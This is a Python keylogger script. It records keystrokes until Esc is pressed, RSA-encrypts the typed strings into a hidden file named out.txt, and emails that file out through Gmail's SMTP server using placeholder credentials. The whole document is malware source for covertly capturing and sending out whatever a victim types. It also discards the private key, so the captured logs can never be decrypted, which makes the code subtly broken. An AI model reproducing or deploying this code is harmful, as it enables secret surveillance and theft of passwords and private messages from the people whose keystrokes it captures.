import keyboard
import subprocess
import rsa
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def encrypt(message: str) -> str:
    (pubkey, privkey) = rsa.newkeys(512)
    encrypted = rsa.encrypt(message.encode('utf8'), pubkey)
    return encrypted

def create_file():
    f = open("out.txt", "x")
    subprocess.check_call(["attrib","+H","out.txt"])
    f.close()

def log_keys():
    try:
        recorded_keys = keyboard.record('Esc')
        string_ver = keyboard.get_typed_strings(recorded_keys)
        f = open("./out.txt", "ab")
        for i in string_ver:
            f.write(encrypt(i))
        f.close()

    except IOError:
        create_file()
        
def email():
    filename = "out.txt"
    attachment = open(filename, "rb")
    part = MIMEBase("application", "octet-stream")
    part.set_payload((attachment).read())
    attachment.close()
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
    message = MIMEMultipart()
    message.attach(part)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login("username", "password")
        server.sendmail("an_email@gmail.com", "another_email@gmail.com", message.as_string())
    except:
        pass

log_keys()
email()